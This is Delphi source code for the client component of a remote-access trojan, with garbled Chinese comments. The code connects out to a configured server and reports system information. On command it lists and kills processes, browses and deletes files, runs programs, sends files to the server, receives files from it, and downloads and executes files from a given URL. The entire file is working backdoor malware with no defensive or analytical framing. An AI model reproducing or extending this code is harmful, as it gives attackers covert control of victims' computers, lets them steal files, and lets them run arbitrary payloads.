program Client;

uses
  Windows, TlHelp32, WinSock, SocketUnit, FuncUnit, Urlmon, ShellAPI;

const
  RemoteHost = 'LocalHost';             //Զ�̼����DNS
  RemotePort = 5656;                    //Զ��Server�˿�
  ClietAssigned = 'public vic';         //Client��ʶ

var
  MasterSocket : TClientSocket;

//���ͺ���
function SendData(StrData: String): Boolean;
var
  Results: Integer;
begin
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
    //: ;
  else
    Result := True;
  end;
end;

//�������ݺ���
function RecvData(): String;
var
  Results: Integer;
  StrTmp: Array[0..2047] of char;
begin
  Result := '';
  Results := MasterSocket.ReceiveBuffer(StrTmp, 2048);

  case Results of
    SOCKET_ERROR: Result := '';
    //: ;
  else
    Result := Copy(StrTmp, 0, Results);
  end;
end;

////////////////////////////////////////////////////////////////////////////////
//��ȡϵͳ��Ϣ����...������û���,CPU����,��Ƶ,
//���������ڴ�,���������ڴ�,�����ڴ�,��Ļ�ֱ���,Client��ʶ
function GetSysInfo:String;
var
  msMemory: TMemoryStatus;
begin
  GlobalMemoryStatus(msMemory);
  Result := GetPcName + #$B9 +
            IntToStr(ReadRegInt(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', '~MHz')) + 'MHz' + #$B9 +
            ReadRegStr(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString') + #$B9 +
            IntToStr(msMemory.dwMemoryLoad) + '%' + #$B9 +
            IntToStr(msMemory.dwAvailPhys div 1024 div 1024) + 'MB' + #$B9 +
            IntToStr(msMemory.dwTotalPhys div 1024 div 1024) + 'MB' + #$B9 +
            IntToStr(GetSystemMetrics(SM_CXSCREEN)) + 'x' + IntToStr(GetSystemMetrics(SM_CYSCREEN)) + #$B9 +
            ClietAssigned;
end;

//��ȡ�����б�
function GetProcessInfo:String;
var
  Process32: TProcessEntry32;
  ProcessSnapshot: THandle;
  Module32: TModuleEntry32;
  ModuleSnapshot: THandle;
  StrTemp: String;
begin
  GetDebugPrivs;
  Result := '';
  ProcessSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
  Process32.dwSize := SizeOf(TProcessEntry32);
  Process32First(ProcessSnapshot, Process32);
  Process32Next(ProcessSnapshot, Process32);
  repeat
    ModuleSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPMODULE, Process32.th32ProcessID);
    Module32.dwSize := SizeOf(TModuleEntry32);
    Module32First(ModuleSnapshot, Module32);
    StrTemp := String(Module32.szExePath);
    CloseHandle(ModuleSnapshot);
    Result := Result + String(Process32.szExeFile) + #$B9 + IntToStr(Process32.th32ProcessID) + #$B9 + StrTemp + #$0D#$0A;
  until not (Process32Next(ProcessSnapshot, Process32));
  CloseHandle(ProcessSnapshot);
end;

//��ȡ������Ϣ
function GetDriveInfo:String;
var
  szBuffer: Array[0..MAX_PATH] of char;
  I, DriveCount: Integer;
  IndexDisk: Pchar;
  dwFree, dwAlls: Extended;
  dw1, dw2, dw3: Int64;
begin
  Result := '';
  DriveCount := GetLogicalDriveStrings(MAX_PATH, szBuffer) div 4;
  for I := 0 to DriveCount - 1 do
  begin
    IndexDisk := Pchar(@szBuffer[I * 4]);
    GetDiskFreeSpaceExA(IndexDisk, dw1, dw2, @dw3);
    dwFree := ((dw1 div 1024) div 1024) / 1024;
    dwAlls := ((dw2 div 1024) div 1024) / 1024;
    Result := Result + String(IndexDisk) + #$B9 + FloatToStr(dwFree) + #$B9 + FloatToStr(dwAlls)+ #$B9 + IntToStr(GetDriveType(IndexDisk)) + #$0D#$0A;
  end;
end;

//��ȡ�����ļ���Ϣ
function ListFiles(Directory:String):string;
var
  FileName: string;
  FindHandle: THandle;
  SearchRec: TWIN32FindData;
  FileType: Integer;
begin
  Result := '';
  FindHandle := FindFirstFile(PChar(Directory + '*.*'), SearchRec);
  if FindHandle <> INVALID_HANDLE_VALUE then
  repeat
    FileName := SearchRec.cFileName;
    if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
    begin
      FileType := 0;
      Result := Result + IntToStr(FileType) + #$B9 + FileName + #$B9 + #$0D#$0A;
    end else
    begin
      //�ļ����� + �ļ��� + �ļ����
      FileType := 1;
      Result := Result + IntToStr(FileType) + #$B9 + FileName + #$B9 + IntToFmFloat(SearchRec.nFileSizeLow) + #$0D#$0A;
    end;
  until (FindNextFile(FindHandle,SearchRec) = False);

  FindClose(FindHandle);
end;

//�ļ����ش������
function DownFile(FileName: string):Boolean;
const
  BufferSize = 2048;
var
  BinaryFile: THandle;
  BinaryBuffer: Pchar;
  StrTmp: String;
  BinaryFileSize, BytesRead: dword;
begin
  Result := False;

  BinaryFile := CreateFile(Pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if (BinaryFile = INVALID_HANDLE_VALUE) then Exit;

  //�����ļ���һ��...�����ļ����
  BinaryFileSize := GetFileSize(BinaryFile, nil);
  if Not SendData('dw' + #$07 + IntToStr(BinaryFileSize)) then Exit;

  //�ȴ�Server���ʹ��俪ʼָ��
  StrTmp := RecvData();
  //���յ������ݳ���Ϊ0���߲��ǿ�ʼ����ָ��
  if (Length(StrTmp) = 0) or (StrTmp[1] <> #$A3) then Exit;

  //���뻺����׼����ʼ�����ļ�
  GetMem(BinaryBuffer, BufferSize);
  try
    repeat
      //Sleep(10);                  //�ʵ����ӳٻ�����Ҫ��
      ReadFile(BinaryFile, BinaryBuffer^, BufferSize, BytesRead, nil);
      //Sleep(10);                  //̫��Ҫ��
      if (MasterSocket.SendBuffer(BinaryBuffer^, BytesRead) = SOCKET_ERROR) then Exit;
    until BytesRead < 2048;
    Result := True;
  finally
    FreeMem(BinaryBuffer);        //�ͷ��ڴ�
    CloseHandle(BinaryFile);        //�رս��̾��
  end;
end;

//�ļ��ϴ��������
function UploadFile(FileName: String):Boolean;
const
  BufferSize = 2048;
var
  BinaryBuffer: Pchar;
  StrTmp: String;
  BinaryFile: THandle;
  BytesReceived: Integer;
  BytesWritten: dword;
begin
  Result := False;

  //�����ļ���
  StrTmp := Copy(FileName, 1, Pos(#$B9, FileName) - 1);

  //�����ļ�
  BinaryFile := CreateFile(Pchar(StrTmp), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (BinaryFile = INVALID_HANDLE_VALUE) then Exit;

  //���Ϳ�ʼ�ϴ�ָ��
  if Not SendData('up') then Exit;
  Sleep(10);
  //����ռ俪ʼ�������ݰ�
  GetMem(BinaryBuffer, BufferSize);
  try
    repeat
      //��������
      BytesReceived := MasterSocket.ReceiveBuffer(BinaryBuffer^, BufferSize);
      //��������Ϊ-1����
      if (BytesReceived = SOCKET_ERROR) then Exit;
      if not WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil)then Exit;
      //Sleep(10);
    until BytesReceived < 2048;
    Result := True;
  finally
    FreeMem(BinaryBuffer);
    CloseHandle(BinaryFile);
  end;
end;
//

//����ѭ����������
procedure LoopRecv();
label Start;
var
  szBuffer: Array[0..MAX_PATH] of char;
  StrTempPath, StrTempPathFile: String;
  StrCmds, CmdIn: String;                     //�������ݻ�����
  StrBuffer, SendBuffer: String;              //��������
begin
  //��ȡ��ʱ�ļ�Ŀ¼
  GetTempPath(MAX_PATH, szBuffer);
  StrTempPath := String(szBuffer);

  while True do
  begin

Start:
    if Not MasterSocket.Connected then Break;
    StrCmds := RecvData;
    if Not MasterSocket.Connected then Break;
    
    if StrCmds[3] <> #$07 then Break;

    //�������
    CmdIn := Split(StrCmds, #07, 1);

    if CmdIn = '*' then Break;          //�رշ����

    if CmdIn = 're' then                //ж�ط����
    begin
      Break;
    end else
    if CmdIn = 'if' then                //��ȡ�����������Ϣ
    begin
      SendBuffer := 'if' + #$07 + GetSysInfo;
    end else
    if CmdIn = 'dl' then                //����ִ���ļ�
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      StrTempPathFile := StrTempPath + ExtractURLName(StrBuffer);
      if URLDownloadToFile(nil, Pchar(StrBuffer), Pchar(StrTempPathFile), 0, nil)= S_OK then
      begin
        ShellExecute(0, 'open', Pchar(StrTempPathFile), nil, nil, SW_SHOW);
        SendBuffer := 'as' + #$07 + 'File downloaded and executed';
      end;
    end else
    //���̹�����
    if CmdIn = 'pr' then        //ˢ�½���
    begin
      SendBuffer := 'pr' + #$07 + GetProcessInfo;
    end else
    if CmdIn = 'tm' then        //��������
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      KillProcessByPID(String(StrBuffer));
      SendBuffer := 'as' + #$07 + 'Process Terminated';
    end else

    {�ص��е��ص�...�ļ�������}
    if CmdIn = 'dr' then            //ˢ�´���Ŀ¼
    begin
      SendBuffer := 'dr' + #$07 + GetDriveInfo;
    end else
    if CmdIn = 'fl' then            //ˢ�´����ļ�
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      SendBuffer := ListFiles(StrBuffer);

      if Not SendData('fl' + #$07) then Break;    //�����б�ʼ��Ϣ
      Sleep(40);
      if Not SendData(SendBuffer) then Break;     //�����б���Ϣ
      Sleep(20);
      if Not SendData('fe' + #$07) then Break;    //�����б���Ϣ���������Ϣ
      Goto Start;
    end else
    if CmdIn = 'de' then            //ɾ�������ļ�
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if DeleteFile(Pchar(StrBuffer)) then
        SendBuffer := 'as'+ #$07 + 'File deleted'
      else
        SendBuffer := 'io'+ #$07;     //ɾ��������io(����������˼)
    end else
    if CmdIn = 'ex' then            //ִ�д����ļ�
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      ShellExecute(0, 'Open', Pchar(StrBuffer), nil, nil, SW_SHOW);
      SendBuffer := 'as'+ #$07 + 'File executed';
    end else
    if CmdIn = 'mf' then            //�½��ļ���
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if CreateDirectory(Pchar(StrBuffer), nil) then
        SendBuffer := 'as'+ #$07 + 'Folder created'
      else
        SendBuffer := 'io'+ #$07;
    end else
    //�ؼ��еĹؼ�.....�����ļ�����......�ٺ١����ĵ����ٵ���
    if CmdIn = 'dw' then            //����Ŀ������������ļ�����ǰĿ¼
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if DownFile(StrBuffer) then
        Goto Start else SendBuffer := 'io'+ #$07;
    end else
    if CmdIn = 'up' then            //����Ŀ������������ļ�����ǰĿ¼
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if UpLoadFile(StrBuffer) then
        Goto Start else SendBuffer := 'io'+ #$07;
    end;

    //����ʧ������ѭ��
    if Not SendData(SendBuffer) then Break;
  end;
end;

//����������
procedure WinMain();
var
  StrCmds: String;
begin
  MasterSocket := TClientSocket.Create;
  MasterSocket.Connect(RemoteHost, RemotePort);

  //���ӳɹ�..�������߱�ʶ
  if MasterSocket.Connected then
  begin
    StrCmds := '*' + GetPcName + #07 + ClietAssigned;
    if SendData(StrCmds) then
    begin
      if MasterSocket.Connected then
      begin
        LoopRecv();
      end;
    end;
  end;

  //�Ͽ�����
  MasterSocket.Disconnect;
  MasterSocket.Free;
end;

begin
  WinMain();
end.
